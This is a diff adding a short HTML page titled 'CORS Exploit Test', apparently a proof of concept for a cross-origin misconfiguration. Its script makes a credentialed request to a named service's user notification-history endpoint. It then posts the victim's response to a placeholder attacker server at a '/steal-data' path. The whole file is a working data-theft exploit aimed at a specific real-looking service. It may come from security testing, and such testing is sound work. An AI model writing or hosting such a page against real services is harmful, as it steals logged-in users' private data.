@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit Test</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.beedeez.com/api/v1/user/notification-history', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                fetch('https://your-server.com/steal-data', {
+                    method: 'POST',
+                    body: xhr.responseText
+                });
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
